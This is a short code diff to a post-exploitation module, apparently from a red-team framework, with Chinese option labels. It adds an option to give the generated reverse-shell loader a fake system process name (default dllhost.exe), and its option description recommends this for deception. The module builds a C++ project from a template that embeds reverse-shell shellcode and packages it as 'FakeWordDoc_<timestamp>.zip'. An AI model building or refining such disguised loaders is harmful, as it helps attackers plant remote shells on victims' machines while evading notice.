@@ -21,6 +21,7 @@ class PostModule(PostPythonModule):
 
     OPTIONS = register_options([
         OptionHander(),
+        OptionStr(name='LoaderName', name_tag="进程名称", desc="载荷的进程名称,建议仿冒系统进程名,增强迷惑性.", default="dllhost.exe"),
     ])
 
     def __init__(self, sessionid, ipaddress, custom_param):
@@ -34,11 +35,12 @@ class PostModule(PostPythonModule):
         return True, None
 
     def run(self):
+        loadername = self.param("LoaderName")
         shellcode = self.generate_hex_reverse_shellcode_by_handler()
         FUNCTION = self.random_str(8)
         FUNCTION1 = self.random_str(9)
         source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode, FUNCTION=FUNCTION,
-                                                        FUNCTION1=FUNCTION1)
+                                                        LOADERFILE=loadername)
 
         filename = f"FakeWordDoc_{int(time.time())}.zip"
         self.write_zip_vs_project(filename, source_code)
